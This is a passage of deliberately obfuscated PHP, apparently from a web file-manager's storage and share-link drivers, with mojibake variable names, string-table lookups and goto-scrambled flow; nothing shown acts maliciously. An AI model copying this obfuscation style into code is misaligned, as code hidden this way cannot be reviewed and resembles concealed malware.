$Ø‰”Éë„ = array($ªàÃµ‚[1524] => $this->bucket, $ªàÃµ‚[1525] => $û†ÑÒŠí, $ªàÃµ‚[1526] => time() + $¹ê›Ì¦è, $ªàÃµ‚[1527] => $ÎÔ‹€ö); if ($ìÑŞªŞ) { $Ø‰”Éë„[$ªàÃµ‚[1436]] = $ìÑŞªŞ; } $İïí¥Ä = base64_encode(json_encode($Ø‰”Éë„)); $ƒñòó†ğ = base64_encode(hash_hmac($ªàÃµ‚[1494], "\120\x4f\123\x54\x26{$ìÃæÂÂ}\46{$ÎÔ‹€ö}\46{$İïí¥Ä}", md5("{$this->userpass}"), !0)); $¦º®‘Ê™ = array($ªàÃµ‚[276] => $İïí¥Ä, $ªàÃµ‚[1528] => "\125\120\x59\x55\x4e\x20{$this->username}\72{$ƒñòó†ğ}", $ªàÃµ‚[196] => $this->endpoint . $ìÃæÂÂ); return $¦º®‘Ê™; } public function download($ºô£÷, $‘¹ÉŠ¬¬) { $ÓÛÑ£ä“ = IO::getPathInner(IO::mkfile($‘¹ÉŠ¬¬)); if (!($ößæ¥ì¹ = $this->link($ºô£÷))) { return !1; } $©ÏÏºŸ = 0; $¶ˆ–„·Ó = 1024 * 200; $¸Õ˜àçé = fopen($ÓÛÑ£ä“, $_SERVER[çâ¥×ø³][1476]); while (!0) { $¡ÅÏ¦Ã© = $this->fileSubstr($ºô£÷, $©ÏÏºŸ, $¶ˆ–„·Ó); if ($¡ÅÏ¦Ã© === !1) { return !1; } fwrite($¸Õ˜àçé, $¡ÅÏ¦Ã©); $©ÏÏºŸ += $¶ˆ–„·Ó; if (strlen($¡ÅÏ¦Ã©) < $¶ˆ–„·Ó) { break; } } fclose($¸Õ˜àçé); return $‘¹ÉŠ¬¬; } public function link($şÈº»œÙ, $¾Íç§ş = array()) { $ë—¡³Æ× =& $_SERVER[çâ¥×ø³]; $şÈº»œÙ = trim($şÈº»œÙ, $ë—¡³Æ×[8]); if (!empty($this->token)) { $¹Õ‹ü¯‡ = strtotime(date($ë—¡³Æ×[1529])); $›õªÏŸŸ = substr(md5($this->token . $ë—¡³Æ×[328] . $¹Õ‹ü¯‡ . $ë—¡³Æ×[1530] . $şÈº»œÙ), 12, 8) . $¹Õ‹ü¯‡; $¾Íç§ş[] = $ë—¡³Æ×[1531] . $›õªÏŸŸ; } $ş·ÂåÚÄ = !empty($¾Íç§ş) ? $ë—¡³Æ×[73] . implode($ë—¡³Æ×[328], $¾Íç§ş) : $ë—¡³Æ×[12]; return $this->getHost() . $ë—¡³Æ×[8] . $şÈº»œÙ . $ş·ÂåÚÄ; } public function fileOut($¥¹²È, $ß°Ä¯¯ğ = false, $¬ŞÄ»§Å = false, $øìùÏ‡ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¥¹²È, $ß°Ä¯¯ğ, $¬ŞÄ»§Å, $øìùÏ‡); } if (!$¬ŞÄ»§Å) { $¬ŞÄ»§Å = $this->pathThis($¥¹²È); } $ÕŸÇ˜ = $ß°Ä¯¯ğ ? array($_SERVER[çâ¥×ø³][1532] . rawurlencode($¬ŞÄ»§Å)) : array(); $ûÀ¸ùÙª = $this->link($¥¹²È, $ÕŸÇ˜); $this->fileOutLink($ûÀ¸ùÙª); } public function fileOutServer($§«„¤Ëß, $ÃÒÆ´»º = false, $ÜÒó„ = false, $Üò÷ãê¤ = '') { parent::fileOut($§«„¤Ëß, $ÃÒÆ´»º, $ÜÒó„, $Üò÷ãê¤); } public function fileOutImage($¾öÜÖş‚, $“”À–£É = 250) { $æ±¤¤ôë = $this->link($¾öÜÖş‚ . $_SERVER[çâ¥×ø³][1533] . $“”À–£É); $this->fileOutLink($æ±¤¤ôë); } public function fileOutImageServer($ëÚÅÁ„ï, $Ÿæªùİ¾ = 250) { parent::fileOutImage($ëÚÅÁ„ï, $Ÿæªùİ¾); } public function hashMd5($œ£ê¾Â) { $Ê¬øŒäÑ =& $_SERVER[çâ¥×ø³]; $™ŒıíÎì = $this->_objectMeta($œ£ê¾Â); return isset($™ŒıíÎì[$Ê¬øŒäÑ[228]]) ? $™ŒıíÎì[$Ê¬øŒäÑ[228]] : !1; } public function size($†Ó¹Ò€ª) { $Ì»äœı = $this->objectMeta($†Ó¹Ò€ª); return $Ì»äœı ? $Ì»äœı[$_SERVER[çâ¥×ø³][76]] : 0; } public function info($º×Ä®Å±) { if ($this->isFolder($º×Ä®Å±)) { return $this->folderInfo($º×Ä®Å±); } else { if ($this->isFile($º×Ä®Å±)) { return $this->fileInfo($º×Ä®Å±); } } return !1; } public function exist($µ´£ÉŠÅ) { return $this->isFile($µ´£ÉŠÅ) || $this->isFolder($µ´£ÉŠÅ); } public function isFile($ã£•ÍÈô) { return !$this->isFolder($ã£•ÍÈô) && $this->objectMeta($ã£•ÍÈô); } public function isFolder($…Ÿöï¹Û) { return $this->cacheMethod($_SERVER[çâ¥×ø³][166], $…Ÿöï¹Û); } protected function objectMeta($«ã¤ÒÍ) { return $this->cacheMethod($_SERVER[çâ¥×ø³][168], $«ã¤ÒÍ); } protected function _objectMeta($…çéõîÚ) { $½¹ô—£Œ =& $_SERVER[çâ¥×ø³]; if ($…çéõîÚ == $½¹ô—£Œ[12] || $…çéõîÚ == $½¹ô—£Œ[8]) { return array(); } $½áÅÃ = $this->ussRequest($…çéõîÚ, $½¹ô—£Œ[1534]); if (!$½áÅÃ[$½¹ô—£Œ[1265]]) { return null; } $á±Ü¼ŒÍ = isset($½áÅÃ[$½¹ô—£Œ[1255]]) ? $½áÅÃ[$½¹ô—£Œ[1255]] : array(); if (!isset($á±Ü¼ŒÍ[$½¹ô—£Œ[1535]])) { return null; } $‘‚àÛê’ = array($½¹ô—£Œ[33] => isset($á±Ü¼ŒÍ[$½¹ô—£Œ[1535]]) ? $á±Ü¼ŒÍ[$½¹ô—£Œ[1535]] : null, $½¹ô—£Œ[76] => isset($á±Ü¼ŒÍ[$½¹ô—£Œ[1536]]) ? $á±Ü¼ŒÍ[$½¹ô—£Œ[1536]] : null, $½¹ô—£Œ[228] => isset($á±Ü¼ŒÍ[$½¹ô—£Œ[1537]]) ? $á±Ü¼ŒÍ[$½¹ô—£Œ[1537]] : null, $½¹ô—£Œ[1504] => isset($á±Ü¼ŒÍ[$½¹ô—£Œ[1538]]) ? $á±Ü¼ŒÍ[$½¹ô—£Œ[1538]] : null); $‘‚àÛê’[$½¹ô—£Œ[1505]] = isset($á±Ü¼ŒÍ[$½¹ô—£Œ[1539]]) ? strtotime($á±Ü¼ŒÍ[$½¹ô—£Œ[1539]]) : $‘‚àÛê’[$½¹ô—£Œ[1504]]; return $‘‚àÛê’; } protected function _isFolder($ÃôõœÖâ) { $úßı¨ñ‘ =& $_SERVER[çâ¥×ø³]; if ($ÃôõœÖâ == $úßı¨ñ‘[12] || $ÃôõœÖâ == $úßı¨ñ‘[8]) { return !0; } $áÔ¡éõ¹ = $this->_objectMeta($ÃôõœÖâ); return isset($áÔ¡éõ¹[$úßı¨ñ‘[33]]) && $áÔ¡éõ¹[$úßı¨ñ‘[33]] == $úßı¨ñ‘[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¨ÖÅƒ¸Ÿ = false) { } public function exist($â·”¢) { $ªÈÎ—øÂ = $this->info($â·”¢); return $ªÈÎ—øÂ[$_SERVER[çâ¥×ø³][216]]; } public function isFile($ñÕäÓ„) { $ ßÃ„•€ = $this->info($ñÕäÓ„); return $ ßÃ„•€[$_SERVER[çâ¥×ø³][216]]; } public function isFolder($À‘Òß¬) { return !1; } public function size($‡²¹¤üş) { $‹ßøÍ¬ = $this->info($‡²¹¤üş); return $‹ßøÍ¬[$_SERVER[çâ¥×ø³][76]]; } public function info($ã†°¦¥¹) { return $this->infoParse($ã†°¦¥¹); } public function infoAuth($·¹œÜÜß) { return $this->infoParse($·¹œÜÜß); } public function infoWithChildren($ºµœë¥) { return $this->infoParse($ºµœë¥); } public function infoFull($¡Èµ’ã˜) { return $this->infoParse($¡Èµ’ã˜); } private function infoParse($ˆôş“ã) { $ÔÎ¡µ†ª =& $_SERVER[çâ¥×ø³]; $²àáÖ§â = $this->header($ˆôş“ã); if (!$²àáÖ§â || !$²àáÖ§â[$ÔÎ¡µ†ª[799]]) { return !1; } $îƒ¦¿®ï = _get($²àáÖ§â, $ÔÎ¡µ†ª[381], 0); $­Ûƒà‹ª = array($ÔÎ¡µ†ª[32] => $²àáÖ§â[$ÔÎ¡µ†ª[32]], $ÔÎ¡µ†ª[84] => $ˆôş“ã, $ÔÎ¡µ†ª[33] => $ÔÎ¡µ†ª[214], $ÔÎ¡µ†ª[76] => intval($îƒ¦¿®ï), $ÔÎ¡µ†ª[175] => get_path_ext($²àáÖ§â[$ÔÎ¡µ†ª[32]]), $ÔÎ¡µ†ª[1416] => $îƒ¦¿®ï > 0 && $²àáÖ§â[$ÔÎ¡µ†ª[1540]], $ÔÎ¡µ†ª[1417] => !1); return $­Ûƒà‹ª; } private function header($“şÖÖâÓ) { $ë¾ñÍÒç =& $_SERVER[çâ¥×ø³]; if (isset(self::$_cacheHeader[$“şÖÖâÓ])) { return self::$_cacheHeader[$“şÖÖâÓ]; } $¬»Å¬Ä = isset($GLOBALS[$ë¾ñÍÒç[1541]]) ? $GLOBALS[$ë¾ñÍÒç[1541]] : !1; $GLOBALS[$ë¾ñÍÒç[1541]] = !0; self::$_cacheHeader[$“şÖÖâÓ] = url_header($“şÖÖâÓ); $GLOBALS[$ë¾ñÍÒç[1541]] = $¬»Å¬Ä; return self::$_cacheHeader[$“şÖÖâÓ]; } public function hashSimple($„Öôù, $‚¾áÅ‹² = false) { $•×ĞØ¹Š =& $_SERVER[çâ¥×ø³]; $Á¨ŠşƒÉ = $this->info($„Öôù); if (!$Á¨ŠşƒÉ || !$Á¨ŠşƒÉ[$•×ĞØ¹Š[216]]) { return !1; } $ÎüÂ’‘Ç = $Á¨ŠşƒÉ[$•×ĞØ¹Š[76]]; $Ø×Ó¿­Š = 200; $èÁÃ¾Œ = 50; if ($ÎüÂ’‘Ç <= $Ø×Ó¿­Š * $èÁÃ¾Œ) { return md5($this->fileSubstr($„Öôù, 0, $ÎüÂ’‘Ç)) . $ÎüÂ’‘Ç; } $©¢“×øÛ = intval($ÎüÂ’‘Ç / $èÁÃ¾Œ); $ı„İ¦Ö‹ = $•×ĞØ¹Š[12]; $íæé®ı¯ = timeFloat(); $ØÌ½Ë°Í = 15; for ($›Í½·‰ = 0; $›Í½·‰ < $èÁÃ¾Œ; $›Í½·‰++) { if (timeFloat() - $íæé®ı¯ > $ØÌ½Ë°Í) { return !1; } $ÀÅì¬£ = $this->fileSubstr($„Öôù, $©¢“×øÛ * $›Í½·‰, $Ø×Ó¿­Š); if (!$ÀÅì¬£) { return !1; } $ı„İ¦Ö‹ .= $ÀÅì¬£; } $ı„İ¦Ö‹ .= $this->fileSubstr($„Öôù, $ÎüÂ’‘Ç - $Ø×Ó¿­Š, $Ø×Ó¿­Š); return md5($ı„İ¦Ö‹) . $ÎüÂ’‘Ç; } public function getContent($á§şšíÇ) { return $this->fileSubstr($á§şšíÇ); } public function fileSubstr($Áò¥áç´, $³ñó…è = 0, $š¤ªáÚ¦ = -1) { $ùªçµÌ· =& $_SERVER[çâ¥×ø³]; $Â¢Å¾‘Í = $this->info($Áò¥áç´); if (!$Â¢Å¾‘Í || !$Â¢Å¾‘Í[$ùªçµÌ·[216]] && $Â¢Å¾‘Í[$ùªçµÌ·[76]] > 1024 * 1024 * 10) { return !1; } if ($š¤ªáÚ¦ === -1) { $š¤ªáÚ¦ = $Â¢Å¾‘Í[$ùªçµÌ·[76]]; } if ($š¤ªáÚ¦ == 0) { return $ùªçµÌ·[12]; } $ãß÷¡ÔÔ = array($ùªçµÌ·[1542] . $³ñó…è . $ùªçµÌ·[831] . ($³ñó…è + $š¤ªáÚ¦ - 1)); $Á“»¶ÁÓ = url_request($Áò¥áç´, $ùªçµÌ·[245], !1, $ãß÷¡ÔÔ, !1, !1, 30); return $Á“»¶ÁÓ[$ùªçµÌ·[1255]] ? $Á“»¶ÁÓ[$ùªçµÌ·[1255]] : $ùªçµÌ·[12]; } public function download($Í¹­¢“…, $ÈĞÈ‚Ôş) { Downloader::start($Í¹­¢“…, $ÈĞÈ‚Ôş); return $ÈĞÈ‚Ôş; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Íİ¥«Î, $À‚›Ó£– = '') { $this->info = $this->info($Íİ¥«Î); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[çâ¥×ø³][84]]; $this->pathOpen = $Íİ¥«Î; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Íİ¥«Î])) { self::$_chunkBuffer[$Íİ¥«Î] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ìÇ“ïƒˆ) { $¸ß²Êú = $this->fileSubstr($this->pose, $ìÇ“ïƒˆ); $this->pose += strlen($¸ß²Êú); return $¸ß²Êú; } public function stream_tell() { return $this->pose; } public function stream_seek($È£ãÜ—ˆ, $–‘¤šé) { $™®–¤Â =& $_SERVER[çâ¥×ø³]; if ($–‘¤šé == SEEK_SET) { $this->pose = $È£ãÜ—ˆ; } else { if ($–‘¤šé == SEEK_CUR) { $this->pose += $È£ãÜ—ˆ; } else { if ($–‘¤šé == SEEK_END) { $this->pose = $this->info[$™®–¤Â[76]] + intval($È£ãÜ—ˆ); } } } if ($È£ãÜ—ˆ < 0) { $this->pose = $this->info[$™®–¤Â[76]] + $È£ãÜ—ˆ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[çâ¥×ø³][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ í²±¾š, $ÎÅÀ„©¢) { $œ·«¼ğ© =& $_SERVER[çâ¥×ø³]; $µ¬Ì÷¦› = $this->info($ í²±¾š); return array($œ·«¼ğ©[1543] => 0, $œ·«¼ğ©[1544] => 0, $œ·«¼ğ©[16] => 32768 + 511, $œ·«¼ğ©[1545] => 0, $œ·«¼ğ©[1546] => 0, $œ·«¼ğ©[1547] => 0, $œ·«¼ğ©[1548] => 0, $œ·«¼ğ©[76] => $µ¬Ì÷¦›[$œ·«¼ğ©[76]], $œ·«¼ğ©[1549] => $µ¬Ì÷¦›[$œ·«¼ğ©[1415]], $œ·«¼ğ©[1505] => $µ¬Ì÷¦›[$œ·«¼ğ©[85]], $œ·«¼ğ©[1504] => $µ¬Ì÷¦›[$œ·«¼ğ©[215]], $œ·«¼ğ©[1550] => 0, $œ·«¼ğ©[1551] => 0); } static $fileInfo = array(); public function info($¡ªÍâÛÜ) { $„öºñ÷Ç = $_SERVER[çâ¥×ø³][1552]; if (isset(self::$fileInfo[$¡ªÍâÛÜ])) { return self::$fileInfo[$¡ªÍâÛÜ]; } if (substr($¡ªÍâÛÜ, 0, strlen($„öºñ÷Ç)) != $„öºñ÷Ç) { return !1; } self::$fileInfo[$¡ªÍâÛÜ] = IO::info(substr($¡ªÍâÛÜ, strlen($„öºñ÷Ç))); return self::$fileInfo[$¡ªÍâÛÜ]; } public static function read($ÃİïûÈ, $¢êÒ¯½Æ, $•š¾ƒ×) { if (!isset(self::$_fopenCache[$ÃİïûÈ])) { $ÛŠ…Ì¢õ = new StreamWrapperIO(); $ÛŠ…Ì¢õ->stream_open($ÃİïûÈ); self::$_fopenCache[$ÃİïûÈ] = $ÛŠ…Ì¢õ; } $ÛŠ…Ì¢õ = self::$_fopenCache[$ÃİïûÈ]; return $ÛŠ…Ì¢õ->fileSubstr($¢êÒ¯½Æ, $•š¾ƒ×); } public static function _read($«€È¿€, $–¸ªˆò, $‚©±¢Ô) { $êÎÔ´ =& $_SERVER[çâ¥×ø³]; $ÁØçãşù = fopen($«€È¿€, $êÎÔ´[1419]); if (!$ÁØçãşù) { return $êÎÔ´[12]; } $‹íË”§ã = 8192; fseek($ÁØçãşù, $–¸ªˆò, SEEK_SET); $£İüë¢– = $êÎÔ´[12]; $áŸöìòŠ = 0; while ($áŸöìòŠ < $‚©±¢Ô) { $ÕËË´±¯ = min($‹íË”§ã, $‚©±¢Ô - $áŸöìòŠ); $£İüë¢– .= fread($ÁØçãşù, $ÕËË´±¯); $áŸöìòŠ += $ÕËË´±¯; } fclose($ÁØçãşù); return $£İüë¢–; } public function fileSubstr($ÜËïÅÀí, $Ì·çÎ¢) { $üÍı™® =& $_SERVER[çâ¥×ø³]; $·ÃÈ‡Š = $this->info[$üÍı™®[76]]; $êûòè£ = $ÜËïÅÀí; $‰Ğğ‘ªî = $Ì·çÎ¢; if ($ÜËïÅÀí < 0) { $ÜËïÅÀí = $·ÃÈ‡Š + $ÜËïÅÀí; } if ($Ì·çÎ¢ === !1) { $Ì·çÎ¢ = $·ÃÈ‡Š - $ÜËïÅÀí; } if ($ÜËïÅÀí + $Ì·çÎ¢ > $·ÃÈ‡Š) { $Ì·çÎ¢ = $·ÃÈ‡Š - $ÜËïÅÀí; } if ($Ì·çÎ¢ <= 0) { return $üÍı™®[12]; } if ($ÜËïÅÀí < 0 || $ÜËïÅÀí >= $·ÃÈ‡Š || $Ì·çÎ¢ <= 0 || $Ì·çÎ¢ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\154\145\122\145\x61\x64\40\x65\162\x72\157\x72\x21\40\x73\x74\x61\162\x74\x3d{$ÜËïÅÀí}\73\154\145\156\147\x74\x68\75{$Ì·çÎ¢}\73\40\163\151\172\145\x3d{$·ÃÈ‡Š}\73"); } $¨¥ª°’ = 64 * 1024; $¼ß´ûÊ½ =& self::$_chunkBuffer[$this->path]; if (!$¼ß´ûÊ½) { $¼ß´ûÊ½ = array(); } $¿æ‡ºÜé = 0; $ñ×·³„È = 0; $š´¿¨Á¯ = $üÍı™®[12]; foreach ($¼ß´ûÊ½ as $¿æ‡ºÜé => $š´¿¨Á¯) { $¿æ‡ºÜé = intval($¿æ‡ºÜé); $ñ×·³„È = $¿æ‡ºÜé + strlen($š´¿¨Á¯); if ($ÜËïÅÀí >= $ñ×·³„È) { continue; } if ($ÜËïÅÀí >= $¿æ‡ºÜé && $ÜËïÅÀí + $Ì·çÎ¢ <= $ñ×·³„È) { return substr($š´¿¨Á¯, $ÜËïÅÀí - $¿æ‡ºÜé, $Ì·çÎ¢); } break; } if (count($¼ß´ûÊ½) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($üÍı™®[1553], $üÍı™®[1554] . count($¼ß´ûÊ½) . "\73\x73\x74\141\x72\164\75{$ÜËïÅÀí}\x2c\154\145\x6e\147\164\x68\x3d{$Ì·çÎ¢}\73\x70\x6f\x73\x65\72{$¿æ‡ºÜé}\x7e{$ñ×·³„È}"); throw new Exception($üÍı™®[1555]); } $äÌ¯Ôàš = intval($ÜËïÅÀí / $¨¥ª°’) * $¨¥ª°’; $Ç¼„¿®„ = ceil(($ÜËïÅÀí + $Ì·çÎ¢) / $¨¥ª°’) * $¨¥ª°’ - $äÌ¯Ôàš; $”ŞÃàÉ = IO::fileSubstr($this->path, $äÌ¯Ôàš, $Ç¼„¿®„); $¼ß´ûÊ½[$äÌ¯Ôàš . $üÍı™®[12]] = $”ŞÃàÉ; ksort($¼ß´ûÊ½); $›ºÍ–† = substr($”ŞÃàÉ, $ÜËïÅÀí - $äÌ¯Ôàš, $Ì·çÎ¢); return $›ºÍ–†; } private function log($Êì€Û¥û, $ùı¡«²¹) { $Îé€¿°ç =& $_SERVER[çâ¥×ø³]; $›ø‘ô¥ = timeFloat() - $this->timeStart; write_log(sprintf($Îé€¿°ç[1556], $Êì€Û¥û, $this->info[$Îé€¿°ç[32]], $›ø‘ô¥, $ùı¡«²¹), $Îé€¿°ç[1235]); } } goto E×£’è„ìª; bÃ¨ÑòîÅÓ: define($_SERVER[çâ¥×ø³][646], $_SERVER[çâ¥×ø³][647]); $mzilfpnjdk = $_SERVER[çâ¥×ø³][648]; if (!$mzilfpnjdk) { die; } goto c‡»’µ›ÁÌ; AŒµà“«°: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ßŞ•¢°‘) { $this->pathParse = $ßŞ•¢°‘; $this->model = Model($_SERVER[çâ¥×ø³][1385]); } protected function infoParse($ùÌÙ‹‰Í, $ŸŒ´²¦¡ = false, $™†«áÜ› = false) { $ã¶ ¤ƒÕ =& $_SERVER[çâ¥×ø³]; return Action($ã¶ ¤ƒÕ[1227])->sharePathInfo($this->pathParse[$ã¶ ¤ƒÕ[84]], !0, $ŸŒ´²¦¡); } public function listPath($ş“»í²î, $Æ¾´®Ú¿ = false) { $‡éˆùøŠ =& $_SERVER[çâ¥×ø³]; $ˆş°¯¹ = parent::listPath($ş“»í²î, $Æ¾´®Ú¿); if (!$ˆş°¯¹) { return $ˆş°¯¹; } if (is_array($ˆş°¯¹[$‡éˆùøŠ[1393]])) { $ˆş°¯¹[$‡éˆùøŠ[1393]] = Action($‡éˆùøŠ[1227])->shareItemInfo($ˆş°¯¹[$‡éˆùøŠ[1393]]); } foreach ($ˆş°¯¹ as $ß“ò´ => $ß‚µ»®Ô) { if (!in_array($ß“ò´, array($‡éˆùøŠ[83], $‡éˆùøŠ[82]))) { continue; } foreach ($ß‚µ»®Ô as $ßèÉ‚ãä => $š‹»é¿) { $ˆş°¯¹[$ß“ò´][$ßèÉ‚ãä] = Action($‡éˆùøŠ[1227])->shareItemInfo($š‹»é¿); } } return $ˆş°¯¹; } public function listAll($†¾ëö¤) { $”†ù¿¶ˆ =& $_SERVER[çâ¥×ø³]; $×ÛÏŒ½ù = IO::info($this->pathParse[$”†ù¿¶ˆ[84]]); if (!$×ÛÏŒ½ù) { return array(); } $Íñß¸Îã = $this->model->listAll($†¾ëö¤); foreach ($Íñß¸Îã as &$Äş×““¾) { $Äş×““¾[$”†ù¿¶ˆ[87]] = Action($”†ù¿¶ˆ[1227])->shareItemInfo($Äş×““¾[$”†ù¿¶ˆ[87]]); } unset($Äş×““¾); return $Íñß¸Îã; } } class PathDriverDriverShareItem { public function __construct($Â¡äÌÀ) { $this->pathParse = $Â¡äÌÀ; } public function __call($É¡ÁğÑÉ, $éÜì©îï) { $µÊ©ÀÚ =& $_SERVER[çâ¥×ø³]; if (method_exists($this, $É¡ÁğÑÉ)) { return; } $†ĞšĞ = call_user_func_array(array($µÊ©ÀÚ[1394], $É¡ÁğÑÉ), $éÜì©îï); $çÇ¥¸»¸ = array($µÊ©ÀÚ[1395], $µÊ©ÀÚ[1396], $µÊ©ÀÚ[1397], $µÊ©ÀÚ[1398], $µÊ©ÀÚ[586], $µÊ©ÀÚ[588], $µÊ©ÀÚ[1399], $µÊ©ÀÚ[107], $µÊ©ÀÚ[1400], $µÊ©ÀÚ[1401]); if (in_array($É¡ÁğÑÉ, $çÇ¥¸»¸)) { $†ĞšĞ = $this->getPathOuter($†ĞšĞ); } return $†ĞšĞ; } public function copy($á´è´á, $Û‹î£ÀÃ, $Óäó©œç = false, $ÁîÀ›Œğ = false) { return $this->copyMove($á´è´á, $Û‹î£ÀÃ, $Óäó©œç, $_SERVER[çâ¥×ø³][586], $ÁîÀ›Œğ); } public function move($øá¥€Éœ, $…Î¿Í†¶, $–€‹‡ƒ¤ = false, $Ê”š˜×á = false) { return $this->copyMove($øá¥€Éœ, $…Î¿Í†¶, $–€‹‡ƒ¤, $_SERVER[çâ¥×ø³][588], $Ê”š˜×á); } private function copyMove($€–Ï–±‡, $¿–©ßÍ¥, $ì×û¬“¼, $„‰íöÈ, $ô‰Å‹ õ = false) { $È¯…îè¦ =& $_SERVER[çâ¥×ø³]; $ÑÅí‡Ä³ = $¿–©ßÍ¥; $µ×”¶ç® = IO::driverMake($¿–©ßÍ¥); if ($µ×”¶ç®->pathParse[$È¯…îè¦[1204]]) { $¿–©ßÍ¥ = $µ×”¶ç®->pathParse[$È¯…îè¦[1204]]; } else { $¿–©ßÍ¥ = $ÑÅí‡Ä³; } $æ©›Á¬ = IO::copyMove($€–Ï–±‡, $¿–©ßÍ¥, $ì×û¬“¼, $„‰íöÈ, $ô‰Å‹ õ); $æ©›Á¬ = $this->getPathOuter($æ©›Á¬); return $æ©›Á¬; } public function pathThis($ò‡üßÀÛ) { return get_path_this($this->pathParse[$_SERVER[çâ¥×ø³][84]]); } public function pathFather($ëü„œË–) { return get_path_father($this->pathParse[$_SERVER[çâ¥×ø³][84]]); } public function iconvSystem($àƒšßâÀ) { return $àƒšßâÀ; } protected function infoParse($¸Ššò, $®ú«Õ·Ì = false) { $¬À†²‰² =& $_SERVER[çâ¥×ø³]; $ á±´Üª = $this->pathParse[$¬À†²‰²[528]][$¬À†²‰²[1228]] . $this->pathParse[$¬À†²‰²[1221]]; if ($®ú«Õ·Ì) { $ÇŸÄ£ï = IO::infoWithChildren($ á±´Üª); } else { $ÇŸÄ£ï = IO::info($ á±´Üª); } $òÆÅ‘§Š = $this->pathParse[$¬À†²‰²[528]]; return Action($¬À†²‰²[1392])->_shareItemeParse($ÇŸÄ£ï, $òÆÅ‘§Š); } public function listAll($º×ˆ­äø) { $ìöÀéˆ =& $_SERVER[çâ¥×ø³]; $©‡œ²î“ = IO::listAll($º×ˆ­äø); $Ş­€Æ = rtrim($this->pathParse[$ìöÀéˆ[528]][$ìöÀéˆ[1228]], $ìöÀéˆ[8]); foreach ($©‡œ²î“ as &$Àâ à„á) { $Àâ à„á[$ìöÀéˆ[84]] = $this->pathDriver . $ìöÀéˆ[8] . ltrim(substr($Àâ à„á[$ìöÀéˆ[84]], strlen($Ş­€Æ)), $ìöÀéˆ[8]); } unset($Àâ à„á); return $©‡œ²î“; } public function listAllSimple($ ÇŒù€©, $éé‡ÂØ = false) { $èÙÖäª³ =& $_SERVER[çâ¥×ø³]; $”¨ü—ü = $this->listAll($ ÇŒù€©); $ÍËæ™Ş¡ = $this->pathParse[$èÙÖäª³[463]]; if (trim($ÍËæ™Ş¡, $èÙÖäª³[8]) == trim(get_path_father($ÍËæ™Ş¡), $èÙÖäª³[8])) { $éé‡ÂØ = !0; } return IO::init($èÙÖäª³[12])->listAllSimpleMake($”¨ü—ü, $ÍËæ™Ş¡, $éé‡ÂØ); } public function getPathOuter($™óåŒÛâ) { $ü´£°´› =& $_SERVER[çâ¥×ø³]; $çÆ­ßÏ = KodIO::parse($™óåŒÛâ); if ($çÆ­ßÏ[$ü´£°´›[33]] == KodIO::KOD_SHARE_ITEM) { return $çÆ­ßÏ[$ü´£°´›[84]]; } $û¹Ã‰¶ = KodIO::clear($™óåŒÛâ); $ ”ºß”€ = KodIO::clear($this->pathParse[$ü´£°´›[528]][$ü´£°´›[1228]]); $›˜ˆ²Ä‰ = substr($û¹Ã‰¶, strlen($ ”ºß”€)); if (substr($û¹Ã‰¶, 0, strlen($ ”ºß”€)) != $ ”ºß”€) { return !1; } return $this->pathParse[$ü´£°´›[1222]] . $ü´£°´›[8] . ltrim($›˜ˆ²Ä‰, $ü´£°´›[8]); } public function getType() { $…í ×¹ =& $_SERVER[çâ¥×ø³]; $´Û£¹­È = str_replace($…í ×¹[74], $…í ×¹[12], get_class($this)); return strtolower($´Û£¹­È); } public function isTypeObject($ šÂÃğ“) { return IO::isTypeObject($ šÂÃğ“); } public function info($§¤Î‚‹) { return $this->infoParse($§¤Î‚‹); } public function infoAuth($Ëà–ËÀ°) { return $this->infoParse($Ëà–ËÀ°); } public function infoWithChildren($Ó¹³‘ô) { return $this->infoParse($Ó¹³‘ô, !0); } public function infoFull($ŸîŠÉ¨Â) { return $this->infoParse($ŸîŠÉ¨Â); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Â“»Ü‚‚) { $this->pathParse = $Â“»Ü‚‚; } protected function infoParse($É³®şæÇ, $¦Ì”ÚÇé = false) { $¤ÌË‚È” =& $_SERVER[çâ¥×ø³]; return Action($¤ÌË‚È”[1227])->sharePathInfo($this->pathParse[$¤ÌË‚È”[84]], !0, $¦Ì”ÚÇé); } public function listPath($ı³€ŠÖ², $Æ¬¼† = false) { $Ş¢˜¶ =& $_SERVER[çâ¥×ø³]; $¯‰‘Û· = IO::listPath($ı³€ŠÖ², $Æ¬¼†); if (!$¯‰‘Û·) { return $¯‰‘Û·; } if (is_array($¯‰‘Û·[$Ş¢˜¶[1393]])) { $ªÓ°¸­ = Action($Ş¢˜¶[1402])->parsePathChildren($¯‰‘Û·[$Ş¢˜¶[1393]], array($Ş¢˜¶[463] => $ı³€ŠÖ²)); $¯‰‘Û·[$Ş¢˜¶[1393]] = Action($Ş¢˜¶[1227])->shareItemInfo($ªÓ°¸­); } foreach ($¯‰‘Û· as $šºªù“¥ => $Äı²éŠ¥) { if (!in_array($šºªù“¥, array($Ş¢˜¶[83], $Ş¢˜¶[82]))) { continue; } foreach ($Äı²éŠ¥ as $¹—ûÎªÇ => $ªÓ°¸­) { $ªÓ°¸­ = Action($Ş¢˜¶[1402])->parsePathChildren($ªÓ°¸­, array($Ş¢˜¶[463] => $ı³€ŠÖ²)); $¯‰‘Û·[$šºªù“¥][$¹—ûÎªÇ] = Action($Ş¢˜¶[1227])->shareItemInfo($ªÓ°¸­); } } return $¯‰‘Û·; } } goto cä‹Æî§†À; aê¤•ï§ƒ: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($ÉÁ¥ß„¶) { $¿á¤Ïï¯ =& $_SERVER[çâ¥×ø³]; return array($¿á¤Ïï¯[2008] => array($ÉÁ¥ß„¶[0], $¿á¤Ïï¯[2009]), $¿á¤Ïï¯[2010] => 